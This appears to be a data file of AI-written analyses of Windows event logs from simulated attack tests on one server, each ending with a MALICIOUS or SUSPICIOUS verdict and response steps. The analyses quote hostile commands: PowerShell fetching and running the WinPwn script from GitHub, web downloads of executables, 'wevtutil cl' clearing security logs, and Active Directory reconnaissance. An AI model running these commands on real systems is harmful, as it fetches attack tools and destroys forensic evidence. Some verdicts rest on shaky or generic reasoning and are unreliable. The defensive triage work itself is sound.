   - The PowerShell invocation with potentially suspicious command `(&{([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()})` indicates the querying of Active Directory objects, which might be part of reconnaissance activities.

3. **High-Integrity Level and Admin Execution**:
   - Processes executed with a high integrity level and by the `admin_test` account, such as `conhost.exe` and `wevtutil.exe`, suggest these were run with administrative privileges, possibly indicating privilege escalation or use of an elevated account.

4. **No Legitimate Business Justification**:
   - The sequence of clearing event logs and unusual PowerShell queries does not align with any routine or legitimate administrative tasks.

### Assessment:
- **Indicators of Compromise (IOC)**:
  - Use of `wevtutil.exe` to clear logs without proper documentation or authorization is considered a strong indicator of compromise (IOC).
  - Use of PowerShell to run potentially reconnaissance commands.

### Threat Assessment:
- The provided activity exhibits behaviors commonly associated with malicious tactics, techniques, and procedures (TTPs). Clearing logs, using PowerShell for uncommon queries, and execution of high-integrity processes suggest potential malicious intent.

### Recommended Actions:
1. **Immediate Containment and Investigation**:
   - Isolate the system from the network to prevent any further unauthorized actions.
   - Conduct a thorough investigation to determine if other systems are compromised.
   - Inspect additional logs and system artifacts to understand the full scope of impact, including any exfiltrations.

2. **Review Permissions and Access**:
   - Analyze user account `admin_test` for any unauthorized uses and change credentials.

WinPwn - GeneralRecon,"### Analysis of Event Logs

Upon reviewing the provided logs, several items of interest have been identified as potentially suspicious or indicative of malicious activity:

#### 1. Sysmon Log Analysis
- **Process Execution of `wevtutil.exe`:** We see multiple instances of `wevtutil.exe` being executed to clear different event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). Normally, this tool is used for managing event logs, but in a context where the logs are actively being cleared, especially across different channels, it raises red flags. The consistent usage of `wevtutil.exe` for clearing logs could be indicative of an attempt to cover tracks.

- **High Integrity Level Processes:** All processes related to `wevtutil.exe` and `conhost.exe` are executed with high integrity, suggesting administrative privileges. This aligns with potential malicious attempts trying to clear evidence by leveraging elevated privileges.

- **PowerShell Activity:** The execution of PowerShell with a command line fetching a script from a remote repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`) is extremely suspicious. This behavior is consistent with an execution of potentially malicious PowerShell scripts that could be used for system reconnaissance or further compromise.

#### 2. Security and System Logs
- **Event Log Clearing**
  - Security event ID `1102` indicates the security log was cleared.
  - System log event ID `104` indicates the system and Windows PowerShell logs were cleared as well.

These actions suggest an attempt to hide traces of activity, which is a common trait in post-exploitation scenarios.

#### 3. PowerShell Log Analysis
- The PowerShell logs corroborate the execution of a potentially unauthorized script meant for reconnaissance or other potentially malicious activities.

### Assessment
Given the combination of:
- Multiple instances of log clearing (using `wevtutil.exe` with administrative privileges),
- The suspicious PowerShell activity downloading and executing scripts from an external source,
- The presence of event log clearing events across security, system, and application logs,

The observed behavior strongly indicates potential malicious activity, consistent with attempts to conduct reconnaissance and cover tracks post-compromise.

### Resolution: **MALICIOUS**
The logs contain definitive signs of malicious activity, including unauthorized PowerShell execution and event log tampering.

### Guidance on How to Proceed:
1. **Immediate Response:**
   - Isolate the affected machine (Server002) from the network to prevent further spread or data exfiltration.
   - Perform a full forensic analysis on the system to understand the extent of the compromise and identify any persistent threats or configurations left by the attacker.

2. **Log Review and Monitoring:**
   - Establish enhanced logging, particularly of PowerShell and Sysmon, and ensure that event log warnings and clearings trigger alerts.
   - Ensure that logs are being centrally aggregated and monitored for unusual activities.

3. **Patch and Update:**
   - Ensure that all systems are patched and up-to-date, especially regarding configurations that could be exploited for log evasion or privilege escalation.

4. **Review and Tighten Permissions:**
   - Audit existing permissions and apply the principle of least privilege, especially for accounts with administrative access.

5. **Educate and Train:**
   - Conduct security awareness training for identifying phishing and social engineering attacks that could introduce similar initial access.

Implementing these actions will help in mitigating the compromise and strengthening defenses against future incidents."
Permission Groups Discovery PowerShell (Domain),"### Detailed Analysis of Logs:

**Key Observations:**

1. **High Integrity Processes:**
   - The `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `powershell.exe`, and `hostname.exe` processes are consistently executed with high integrity level by the user `SERVER002\admin_test`. It's worth noting that `wsmprovhost.exe` is the parent process for a significant number of these activities.

2. **Event Log Clearance:**
   - The use of `wevtutil.exe` to clear event logs is a notably suspicious activity. This action was performed on multiple channels:
     - `Sysmon`: `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `Application`: `wevtutil.exe cl Application`
     - `System`: `wevtutil.exe cl System`
     - `Security`: `wevtutil.exe cl Security`
   - Clearing of logs is generally done to cover tracks and is a strong indicator of malicious activity.

3. **PowerShell Execution:**
   - The execution of a PowerShell script: `""powershell.exe"" & {get-ADPrincipalGroupMembership $env:USERNAME | select name}` indicates potential reconnaissance action, which is seen when users attempt to enumerate permissions or group memberships.

4. **Edge Update Executions:**
   - Numerous instances of Edge Update executions by `NT AUTHORITY\SYSTEM` are observed. While these do not immediately indicate malicious behavior, the associated timing with the clearing of logs can suggest potential misuse:
     - Various processes and setup executables associated with Edge Update are spawned in a short succession.

5. **User `admin_test`:**
   - The user `SERVER002\admin_test` is consistently active during these events. This user appears in most of the suspicious process executions and log clearances.

**Assessment of Malicious Activity:**

- **Event Log Clearing:** The use of `wevtutil.exe` to clear logs stands out as a significant indicator of malicious intent. This action suggests a deliberate attempt to erase activity traces, which is commonly employed following unauthorized access or actions that an attacker wants to hide.
  
- **Reconnaissance Activities:** The use of PowerShell to query Active Directory group memberships (`get-ADPrincipalGroupMembership`) shows intentions towards gathering sensitive information about user access and privileges.

- **Anomalous Process Behavior:** The sequence of high-integrity level processes, potentially exploitative PowerShell usage, and log-clearing actions are highly indicative of compromise.

### Final Resolution:

**MALICIOUS**

**Threat/Risk Assessment:**
- The actions observed suggest potential system compromise, unauthorized data gathering, and concealment of activities. The user `SERVER002\admin_test` or credentials associated with this user are likely involved in these malicious activities.

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the host `Server002` to prevent further network communication and potential data exfiltration or lateral movement.

2. **Credential Review:**
   - Investigate and secure the account `admin_test`. Reset credentials and consider this account potentially compromised.

3. **Forensic Investigation:**
   - Preserve current state data and conduct a full forensic analysis, including disk and memory captures, to identify any malware or exploit tools.

4. **Review Other Systems:**
   - Given the nature of the attack, review other systems for similar activity patterns that might indicate spread or coordinated activity.

5. **Strengthen Security Posture:**
   - Implement additional monitoring on high privilege accounts and ensure proper log retention policies are enforced.
   - Consider deploying additional security rules or policies to detect and alert upon similar events in the future."
Remote System Discovery - net group Domain Computers,"### Detailed Analysis

#### Anomalous and Suspicious Activities
Upon examining the provided event logs, several activities raise red flags:

1. **Cleared Event Logs:**
   - Multiple instances where logs were cleared (Event ID 104) for the System, Windows PowerShell, and Security channels using `wevtutil.exe` by the user `admin_test`. Notably, Event ID 1102 in the Security log indicates that the security event logs were cleared. Log clearing is a common technique used by attackers to cover their tracks.
   - Logs were cleared by a user with high privileges, which requires further scrutiny.

2. **Time Modification:**
   - Modification of system time captured in both Kernel General (Event ID 1) and Security logs (Event ID 4616). Temporarily changing the system time can be another tactic to evade detection.

3. **Unusual Command Executions:**
   - The execution of `cmd.exe` with the command `net group ""Domain Computers"" /domain` suggests attempts to enumerate domain information. This is a typical reconnaissance step performed by adversaries to gather more details about the environment.
   - The `whoami.exe` and `hostname.exe` executions are standard utilities for gathering information about the user context and system but occurring amidst other suspicious activities raise concern.

4. **Privilege Escalation:**
   - The usage of `admin_test` with elevated privileges, as evidenced by the logon events (Event ID 4672), suggests potential misuse or compromise of this account.
   - Privileges like SeDebugPrivilege, SeBackupPrivilege, etc., were granted, which allows significant control over system operations.

5. **Remote Logon:**
   - There are logon events (Event ID 4624 and 4634) with Logon Type 3, indicating a network logon possibly from a remote system (DESKTOP-3HL5B2P), further evidenced by the IP address 192.168.0.102. Remote logins of privileged accounts to critical machines (like a server) need verification.

6. **Process Execution Patterns:**
   - The presence of multiple `conhost.exe` processes tied to other critical process executions such as `wevtutil.exe` aligns with other suspicious patterns observed.

#### Risk Assessment and Evidence of Potential Compromise
The logs provide substantial evidence of potential malicious activity:

- **Indicators of Log Manipulation:** The use of `wevtutil.exe` to clear event logs is indicative of attempts to obfuscate malicious actions.
- **Unauthorized Privilege Use:** The assignment of high-level privileges to `admin_test` during suspicious activities signals potential exploitation or misuse.
- **Reconnaissance Behavior:** Network enumeration through commands like `net group` is not typical in regular operational scenarios for a CEO's machine.
- **Temporal Obfuscation:** Altering the system time shortly before logs are cleared suggests attempts to disrupt chronological forensic analysis.

### Resolution
Based on the analysis, the activities observed in the logs are conclusive of malicious intent, likely involving unauthorized access and covering tracks by clearing event logs. It suggests a breach and compromise of a privileged account (`admin_test`), and the logs indicate sophisticated attempts at maintaining persistence and concealment.

**Resolution:** **MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent further unauthorized actions.
   - Change credentials for `admin_test` and other potentially affected accounts.

2. **Forensic Investigation:**
   - Conduct a comprehensive forensic analysis to identify the vector used for compromise.
   - Examine network traffic for other instances of suspicious remote access from 192.168.0.102 or other IPs.

3. **System and Network Hardening:**
   - Review and limit privileges granted to high-level accounts.
   - Implement monitoring solutions for log tampering and unauthorized access attempts.

4. **Communication:**
   - Notify relevant internal departments and possibly external incident response teams to assist in containment and remediation efforts.

5. **Audit and Compliance:**
   - Perform a full audit of system configurations and security policies.
   - Revisit incident response plans and train staff on detecting similar threats in the future."
Extract chrome Browsing History,"Based on the analysis of the provided log entries, there are several indicators suggesting potentially malicious activity on the Windows host.

**1. Execution of Wevtutil and Clearing Logs:**
   - Multiple instances of the `wevtutil` command line utility being used to clear event logs, specifically targeting the Microsoft-Windows-Sysmon, Application, and Security logs.
   - Event ID 1102 in the Security log and Event ID 104 in the System log indicate that the logs were cleared. This is a known method used by attackers to erase their tracks after compromising a system.

**2. Suspicious PowerShell Activity:**
   - The PowerShell logs indicate a script execution involving the extraction of browsing history from Google Chrome using PowerShell. This activity matches the characteristics often seen in data collection and exfiltration attempts.

**3. Use of the `whoami` and `hostname` Commands:**
   - These commands are often executed by malicious actors to gather information about the system and the user context under which they are operating.

**4. Elevated Privileges and Use of SYSTEM Account:**
   - Many of the activities, including the use of PowerShell and `wevtutil`, are executed under high integrity levels or by the SYSTEM account, suggesting privilege escalation.

**5. Time Tampering:**
   - Security logs show time change events, possibly indicating attempts to manipulate or obfuscate timestamps to potentially align or hide malicious activities.

**Assessment:**
The combination of command-line utilities execution (such as `wevtutil` for clearing logs), PowerShell script execution for information extraction, execution of `whoami`, and `hostname`, and the evidence of privilege escalation strongly indicates malicious behavior. The clearing of logs is a critical factor pointing toward an attempt to cover tracks, a common practice following unauthorized activity.

**Resolution: MALICIOUS**

**Recommendation:**
- Immediately contain the host and investigate further by conducting a full forensic analysis.
- Review EDR alerts and other security controls for further indicators of compromise.
- Consider resetting credentials, especially for privileged accounts like `admin_test`.
- Close off any unnecessary service accounts or permissions that may have allowed this intrusion.
- Ensure that all system and application updates and patches are applied to prevent further exploitation.
- Educate users on recognizing and reporting suspicious activities."
AWS - EC2 Security Group Enumeration,"Upon reviewing the provided Windows event logs, I have identified several events that point towards potentially malicious activity on the machine in question. Here is a detailed analysis:

### Observations of Suspicious Behaviors:

1. **Clearing of Event Logs:**
   - **Event ID 1102** from the Security log indicates that the security log was cleared by the user ""admin_test"". Clearing event logs is a common tactic used by attackers to hide their activities.
   - **Event ID 104** from the System log shows that system logs and PowerShell logs were cleared by the same user. This further supports the attempt to cover tracks.

2. **Execution of System Utilities with Admin Privileges:**
   - Several instances of `wevtutil.exe` are noted in the Sysmon log with various command lines such as `cl Microsoft-Windows-Sysmon/Operational`, `cl System`, and `cl Security`. This tool is used to manage event logs and can be employed to clear logs, as noted above.
   - **High Integrity Level**: These commands were executed with high integrity (admin privileges), indicating the user had significant system control.

3. **Command Line Execution from cmd.exe:**
   - A suspicious command was executed via `cmd.exe` to query AWS security groups: `""cmd.exe"" /c aws ec2 describe-security-groups --profile default --output json`. This indicates potential unauthorized cloud service interaction.

4. **System Time Modification:**
   - Events 4616 depict changes to system time. While occasionally benign (e.g. time synchronization), if done shortly before or after clearing logs, it could suggest attempts to disrupt log integrity and timeline tracking.

5. **Numerous System Utilities Executed:**
   - Logs show execution of `hostname.exe`, `whoami.exe`, and other system utilities. These commands can be typical in legitimate use but may also occur during reconnaissance by an attacker.

6. **Microsoft Edge Update Activity:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` activities. While these could be legitimate, the volume and timing alongside other suspicious events require correlation to ensure these processes were authorized and not used for unwanted persistence or lateral movement.

### Assessment:

Based on the activities noted from the logs, particularly around clearing of event logs and execution of potential reconnaissance or exfiltration commands (e.g., querying AWS security groups), I determine the described behaviors are extremely concerning and indicative of potentially malicious activity. The combination of clearing logs, possible timelines manipulation, and unusual external queries suggest an attempt to cover tracks possibly associated with unauthorized information gathering or exfiltration.

### Resolution: MALICIOUS

### Recommendations for Action:

1. **Containment:**
   - Immediately isolate the affected machine from the network to prevent further unauthorized access or data exfiltration.

2. **Preserve Evidence:**
   - Ensure that any other forensic evidence is collected using a non-intrusive method that does not alter the current state of the system (e.g., memory dumps, disk images).

3. **User Verification:**
   - Verify recent activities of the user ""admin_test"". Confirm whether the actions noted were authorized and documented IT administrator activities.

4. **Event Log Monitoring:**
   - Re-enable and closely monitor event logging to detect further suspicious activities. Implement alerting for critical changes such as log clearing.

5. **System Audit:**
   - Review any other access or changes in the environment around the timestamps noted for anomalous activities, potentially expanding the investigation to correlated systems or user accounts.

6. **Password and Credential Changes:**
   - Enforce immediate password changes for the user account involved and any other accounts that might have been accessed or compromised during this event.

7. **Cloud Resource Cross-Verification:**
   - Investigate AWS account activity for unauthorized changes, especially related to the use of AWS CLI commands from this host.

This assessment and these actions are crucial in understanding and mitigating any potential breach or insider threat within the organization."
Check computer location,"### Analysis of the Logs

#### Suspicious and Anomalous Behavior

1. **Event Log Clearing:**
   - There is evidence of event log clearing on the system. The `Security log` indicates Event ID 1102, which shows that the security log was cleared by the user `admin_test`. Log clearing can be indicative of an attempt to cover tracks and is often associated with malicious or unauthorized activity.
   - Similarly, the `System log` shows Event ID 104, indicating the clearance of the System and Windows PowerShell logs by the same user `admin_test`.

2. **Use of Eventing Command Line Utility (wevtutil):**
   - Multiple entries in the `Sysmon log` show the execution of `wevtutil.exe` with the `cl` (clear) command. This directly corresponds with the log clearances seen in the `Security` and `System` logs.
   - The clearing of logs via command line utilities is a known practice to maintain stealth within an environment after potentially malicious actions have been taken.

3. **Command Line Execution:**
   - The Sysmon logs show the execution of `cmd.exe /c reg query` which queries the registry key `HKEY_CURRENT_USER\Control Panel\International\Geo`. While querying the registry is not inherently malicious, the context of these logs (i.e., following log deletion) makes it suspicious.

4. **Time Change Events:**
   - The Security log with Event ID 4616 shows changes in system time by `LOCAL SERVICE` using `svchost.exe`. Unauthorized changes to system time can be a technique to circumvent time-based security protocols or log records; although, in this context it might also be benign.

#### Indicators of Malicious Activity

- **Multiple Tools and Entries Documenting Log Clearing:**
  - The consistent and concentrated effort shown in using `wevtutil` to clear logs, without any legitimate reason provided, is strong evidence suggesting malicious intent.
  
- **Execution Patterns:**
  - The pattern of events around the same time suggests a concerted effort to clear logs, potentially following other unauthorized activities.

- **Privilege and Integrity Level:**
  - The commands were run at a high integrity level by `admin_test`, suggesting that actions were performed with elevated privileges. This combination of actions points towards abuse of privileged accounts for potentially malicious purposes.

### Assessment

Based on the analysis above, the activity observed is highly suggestive of an attempt to cover up unauthorized actions on the system. The act of clearing logs, especially using system utilities like `wevtutil`, indicates potential malicious activity by the user `admin_test`. The absence of legitimate explanations or documentation for these actions solidifies the assessment of malicious behavior.

### Resolution

**MALICIOUS**

### Guidance and Actions to Proceed

1. **Immediate Response:**
   - Disconnect the affected device from the network to prevent further potential malicious actions.
   - Begin forensic investigation processes on the device to identify any additional malicious activities not covered by these logs (e.g., persistence mechanisms, data exfiltration).

2. **Review and Audit:**
   - Audit the actions performed by the user `admin_test` and determine the scope of compromised activities. Assess if other devices or accounts may have been affected.
   - Check if this user account was compromised or if there is an insider threat scenario.

3. **Security Controls Review:**
   - Review logs and retention policies to ensure logs cannot be easily cleared without detection.
   - Consider implementing enhanced monitoring and alerting for log clearing activities and unauthorized privilege escalations.

4. **User and Authentication Policies:**
   - Conduct a comprehensive review of user account permissions, particularly for privileged accounts.
   - Implement stronger authentication protocols and possibly employ Privileged Access Management (PAM) solutions to enforce stricter control over administrative actions.

5. **Prepare for Incident Disclosure:**
   - Depending on the regulatory requirements, prepare to disclose the breach to relevant authorities or stakeholders if necessary."
System Time Discovery,"Upon reviewing the provided Windows event logs, several activities warrant further analysis:

1. **Log File Clearing**:
   - There are multiple instances of event logs being cleared (`EventID 104` in the System log and `EventID 1102` in the Security log) by the user ""admin_test"".
   - The command `wevtutil.exe cl` was used to clear the logs for various channels such as the System, Application, Windows PowerShell, and Microsoft-Windows-Sysmon/Operational.
   - Log clearing is significant because it might be an attempt to hide malicious activities. This is potentially a very suspicious activity when performed without good reason.

2. **Use of `whoami.exe`, `hostname.exe`, and `cmd.exe`**:
   - The use of `whoami.exe` and `hostname.exe` is not inherently malicious but could be part of a reconnaissance step if used unexpectedly or without legitimate reason.
   - The command-line `cmd.exe /c net time \\\\localhost & w32tm /tz` was executed, which reads the local time and timezone. This can suggest time manipulation, possibly to affect event timestamping.

3. **Time Change Events**:
   - The logs contain repeated time change events (`EventID 4616` from Security log), indicating that the system time was modified multiple times.
   - Time tampering can be indicative of malicious activity, often used to manipulate log events' timestamps.

4. **Microsoft Edge Update Activity**:
   - There is a significant amount of Microsoft Edge update activity. Although this could be routine, the creation and execution of temporary files and update executables could be interesting if not confirmed as expected corporate update behavior.

5. **High Integrity Level Processes**:
   - Multiple processes are executed with 'High' integrity level, which could indicate privileged operations that may include malicious activities.

### Assessment:

- **Suspicious Behavior**: The combination of log clearing activities, time changes, and the use of diagnostic tools and utilities like `whoami.exe` and `cmd.exe` for unverified purposes results in a suspicious context. If these actions were not part of expected maintenance or legitimate administrative tasks, they could point to potential compromise or an attempt to cover up malicious actions.

### Resolution:

- **SUSPICIOUS**: The logs contain suspicious activity that requires further investigation. It is crucial to determine the legitimacy of these actions, especially the log clearing and time changes, and verify if the Edge update activities match expected patterns.

### Guidance:

1. **Immediate Actions**:
   - Verify with the ""admin_test"" user or relevant department if there was any legitimate reason for clearing the logs or changing the system time.
   - Conduct a thorough endpoint analysis for signs of modification or signs of further malicious activity on the machine.
   - Review any available network traffic logs for unusual patterns or data exfiltration attempts.

2. **Advanced Investigation**:
   - If possible, recover or analyze backups of cleared logs to identify any covered-up activities.
   - Investigate other systems and user activities within the same network for similar patterns.

3. **Future Actions**:
   - Implement stricter monitoring and alerts for log clearing activities.
   - Review endpoint security policies and ensure proper logging and alerting is in place for key activities.
   - Consider enhanced user training or administrative policies to minimize privileged account misuse."
Enumerate Active Directory Groups with ADSISearcher,"Upon analyzing the provided Windows event logs, several key points and potentially suspicious activities were noted, leading to the following detailed assessment:

### Suspicious or Anomalous Behavior:
1. **Frequent Use of PowerShell**: The logs show frequent execution of PowerShell commands (EventID: 17977) with arguments likely used to query Active Directory (AD) groups using `ADSISearcher`. The PowerShell command involves searching for all objects of the category ""group"", which could be an attempt to enumerate AD groups, a typical reconnaissance behavior during lateral movement or pre-attack phases.

2. **Clearing of Event Logs**: Logs indicate actions to clear various event logs:
   - **Security Log**: EventID 1102 shows ""admin_test"" clearing the Security log.
   - **System Log**: EventID 104 shows ""admin_test"" clearing the System log.
   - **Windows PowerShell Log**: EventID 104 shows the clearing of Windows PowerShell logs.
   
   Clearing of logs can indicate an attempt to hide malicious activity, as attackers often clear logs to cover their tracks.

3. **Execution of System Utilities**: Execution of `wevtutil.exe` with commands altering event logs under a high integrity level by ""admin_test"" (multiple EventIDs) suggests attempts to manipulate event logs, particularly focusing on the Sysmon/Operational and Application logs.

4. **Time Changes by svchost.exe**: There are events showing a time discrepancy reset by the svchost.exe process, which might be involved in tampering activities to alter timestamps and potentially evade detection.

### Indicators of Malicious Activity:
- **Log Clearing**: Regular clearing of logs, especially by a non-system or specific admin account (here, ""admin_test""), is a strong indicator of malicious intent unless explicitly justified for maintenance or other legitimate tasks.
- **PowerShell Activity**: The specific PowerShell activity querying group objects without a direct use case context suggests AD reconnaissance, typically associated with early stages of an attack.
- **Usage of System Tools**: Tools like `wevtutil.exe`, when used in quick succession with high privilege levels to clear logs, align with tactics used by threat actors for system manipulation.

### Assessment:
The combination of PowerShell usage for querying AD, clearing of various event logs, and usage of high-privilege system utilities indicates potential malicious activity. This behavior aligns well with post-exploitation tactics where an attacker seeks to maintain access, gather internal intelligence, and cover tracks.

### Resolution: **MALICIOUS**

### Recommendations:
1. **Immediate Investigation**: Conduct a thorough investigation into activities performed by the ""admin_test"" account, including past login history and any AD-related queries or modifications.
2. **Review Access Logs**: Check access logs to verify whether the ""admin_test"" account has been compromised or if it has exhibited any unauthorized or unusual activity.
3. **Security Posture Enhancement**: Implement enhanced logging and monitoring, particularly for PowerShell and system utility execution across critical systems. 
4. **Incident Response**: Initiate incident response protocols to contain potential threats and prevent further unauthorized activities.
5. **User Awareness Training**: Educate users on the risks of leaving privileged accounts on shared or less secure machines without proper monitoring and logging controls in place.

This analysis suggests malicious intent based on the behavior captured in the logs, warranting an immediate response to secure the system and network environment."
Enumerate Active Directory Groups with Get-AdGroup,"Upon reviewing the logs provided for July 2023, there are several events that raise suspicion of potentially malicious activity. Below is a breakdown of the observations and analysis:

### Indicators of Suspicious Behavior:

1. **Clearing of Event Logs:**
   - At times `13:37:26` (System Log EventID `104` and Security Log EventID `1102`), logs were cleared by the user `admin_test`. Clearing logs is common post-compromise behavior to delete traces of unauthorized activities.

2. **Usage of `wevtutil.exe`:**
   - The process `wevtutil.exe` was observed running multiple times (`EventID 1`) with the command-line argument to clear various logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `""Windows PowerShell""`. This is consistent with attempting to remove traces of actions that were potentially unwanted or unauthorized.

3. **Privileged Account and Access:**
   - The account `admin_test` had elevated privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.) as seen in Security events (`EventID 4672`). Abuse of elevated privileges could facilitate malicious actions.

4. **PowerShell Activity:**
   - PowerShell sessions initiated with commands such as `Get-AdGroup -Filter *`. While this cmdlet is legitimate in querying Active Directory, its execution, in concert with log clearing and privileged account utilization, could be part of reconnaissance or lateral movements within a network.

5. **Timeline and Consistency:**
   - All these activities occur closely in time, suggesting they are part of a coordinated sequence rather than isolated events.

### Assessment:

The combination of cleared event logs, execution of `wevtutil.exe` for clearing different log files, and the use of a privileged account to run potentially sensitive PowerShell commands is highly indicative of suspicious activity. This coordinated sequence is often associated with attempts to cover tracks post-compromise.

### Guidance:

1. **Mark the Activity as **MALICIOUS**:
   - Given the coordinated events to alter or erase logs and the use of privileged commands, this behavior is consistent with malicious intent, warranting immediate isolation and forensic investigation of the involved system and user account.

2. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further potential exfiltration or lateral movement.
   - Conduct a full forensic analysis of the system and collect disk images for deeper investigation.
   - Audit and review all actions taken by the user `admin_test` within the time frame and cross-reference with other systems for unusual access patterns.
   - Reset credentials and permissions for the account `admin_test` and any other potentially compromised accounts.

3. **Long-term Actions:**
   - Implement stricter monitoring and alerting for actions like log clearing and privileged executions.
   - Conduct a full security audit and consider deploying tools to detect and prevent unauthorized changes to logs.
   - Educate users on identifying and preventing malicious entries, with emphasis on the secure handling of elevated privileges.

By taking these actions, the potential threat can be mitigated while ensuring the stability and security of the broader network infrastructure."
Remote Desktop Services Discovery via PowerShell,"Upon reviewing the provided Windows event logs, the following findings and analysis can be presented:

### Suspicious Activities:
1. **Event Log Cleared (System Log, Security Log, Windows PowerShell Log):**
   - The clearing of logs is a significant indicator of potential malicious activities as it suggests an attempt to cover tracks after unauthorized or sensitive actions were taken.
   - Specifically, the logs show that the event channels ""System"", ""Windows PowerShell"", and ""Security"" were cleared by the user ""admin_test"".

2. **Use of `wevtutil.exe`:**
   - The command-line utility `wevtutil.exe` was used multiple times for clearing logs (observed in Sysmon logs). This kind of activity, especially right before or after suspicious actions, usually indicates malicious intent.
   - This was executed with high integrity by the user ""SERVER002\\admin_test"", specifically with commands targeting the ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"" logs.

3. **Time Manipulation:**
   - There are events indicating changes in system time, often used to manipulate logs to obfuscate actions. This change happened via the `svchost.exe` process and was attributed to the ""LOCAL SERVICE"".

4. **Execution of PowerShell Commands:**
   - A PowerShell command to get services related to “Remote Desktop Services” was executed. While on its own, this may not be inherently malicious, combined with the other suspicious activities, it could indicate an attempt to gather information on or manipulate remote connection capabilities.

5. **High Privileges and Login Information:**
   - Events detail privileged actions (such as SeSecurityPrivilege, SeBackupPrivilege) being taken, suggesting the user had elevated privileges, possibly assisting in the execution of the suspicious activities mentioned above.
   - Authentication logs indicate sessions established using NTLM, an older, less secure protocol for network authentication.

### Assessment:
The detected activities, such as the clearing of system logs, systematic use of `wevtutil.exe` for log clearance, suspicious PowerShell usage, system time alterations, and the presence of privileged actions, collectively suggest a concerted effort to obscure potentially unauthorized actions on the system. The consistent use by the user ""admin_test"", especially with elevated privileges, indicates a high risk of compromised credentials or intentional misuse by the said user.

### Resolution:
Given the evidence of log tampering, the execution of potentially reconnaissance scripts, and privilege usage anomalies, the situation can be classified as:

**MALICIOUS**

### Guidance on How to Proceed:
1. **Isolate the machine (Server002)** from the network immediately to prevent further potential damage or lateral movement.
2. **Conduct a deep forensic analysis** of the host to understand the full scope of the compromise, including identifying any other tools or malware used by the threat actor.
3. **Review user account activities**, particularly for ""admin_test"", and consider resetting credentials and reviewing authorization policies.
4. **Patch and update** all systems to close vulnerabilities, especially those associated with known privilege escalation or log tampering techniques.
5. **Enhance monitoring** and utilize stricter logging practices going forward to ensure such events are detected earlier and to improve future investigations.
6. **Report the incident** to appropriate internal security teams and possibly external agencies, depending on the sensitivity and impact of the breach."
Port Scan using python,"Based on the provided Windows event logs, there are multiple indicators of potentially suspicious and possibly malicious activity. Below is a breakdown and assessment:

1. **PowerShell Events:**
   - **Event Record 1066 (PowerShell):** Executed a PowerShell command to create a directory and download a Python executable from an external URL (""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe""). The use of `Invoke-WebRequest` to download an executable and the immediate execution of this downloaded file, especially from a temporary directory path like ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\"", is suspicious.
   - **Event Record 1069 and subsequent events:** PowerShell is used to run a Python script (`T1046.py`) which indicates execution of a script likely part of the Atomic Red Team framework (T1046 is related to Network Service Scanning in MITRE ATT&CK). This execution suggests potential offensive security measures, commonly used in penetration tests or by threat actors during reconnaissance phases.

2. **Security Events:**
   - **Event ID 1102 (Security Log Cleared):** The security log was cleared by the user ""admin_test"". Clearing event logs is a common tactic to cover tracks and hide illicit activities, which strongly indicates malicious intent.
   - Multiple **Event ID 4798** entries: Queries related to local security groups by `CompatTelRunner.exe`. While `CompatTelRunner.exe` is a legitimate Microsoft process, it is unusual for it to query user and security group information repeatedly in a short timeframe.

3. **Sysmon and System Events:**
   - **Event ID 18019, 18038, and others:** Frequent use of `wevtutil.exe` to clear logs (security, application, and system) is recorded. This correlates with the log clearing event in the security logs.
   - **Event ID 18050 (Sysmon):** A process for running Python code is linked directly to PowerShell, supporting potential malicious or penetration testing activity.

4. **Overall Pattern and Activity:**
   - The combination of a PowerShell script for network scanning, the downloading and execution of binaries from the internet, and the clearing of security logs indicate that these activities are not consistent with standard administrative or user behavior.

**Assessment and Resolution:**
- The identified activities, especially the execution of PowerShell commands that download and execute external files, the frequent querying of security groups, and the clearing of logs, are indicative of a threat. This leads to the conclusion that the activities are not only suspicious but appear to be actively malicious.
- There are clear signs of an attempt to perform network reconnaissance followed by attempts to cover tracks by clearing logs. This pattern is typical of an intrusion or internal threat actor behavior.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately conduct a forensic investigation to understand the scope and intent of the activities.
- Isolate the affected systems to prevent potential lateral movement or data exfiltration.
- Conduct a thorough review of all executed scripts, especially any downloaded content, for additional threats or payloads.
- Reset passwords and examine privileged accounts for any unauthorized changes.
- Review and reinforce security protocols and monitoring mechanisms to detect similar activities in the future.
- Consult with legal and compliance teams to ensure regulatory obligations are met while addressing this incident."
Windows Internal Packet Capture,"In analyzing the provided Windows event logs, several patterns and sequences of actions stand out that warrant detailed explanation and assessment based on potential malicious activity:

1. **Event Logs and Process Analysis:**
   - We observe multiple instances of the `wevtutil.exe` utility being used to clear event logs: ""Application,"" ""System,"" ""Security,"" and ""Windows PowerShell."" The command-line argument used in conjunction with `wevtutil.exe` is `cl` (clear), indicating that the logs were cleared.
   - Multiple `conhost.exe` processes are spawned as children of the `wevtutil.exe` process, which is typically benign as `conhost.exe` is a Microsoft process responsible for managing console windows.
   - Privileged processes and services, such as `svchost.exe`, are running under system integrity level, which is normal for system services.
   
2. **Specific Events of Interest:**
   - Log cleaning events (Event ID 1102 for security and Event ID 104 for system and other logs) execute under the username `admin_test`. The repeated clearing of logs is a strong indicator of potential nefarious activity aimed at covering tracks.
   - Execution of `cmd.exe` with commands that initiate network tracing using `netsh.exe`, which could be unusual depending on the user’s role and purpose.
   - Execution of utilities such as `whoami.exe` and `hostname.exe`, while common, could be part of privilege reconnaissance if used in conjunction with other suspicious activities.

3. **Privilege and User Context:**
   - The user `SERVER002\admin_test` is involved in the execution of many suspicious processes and has a high integrity level, indicating administrative rights. 
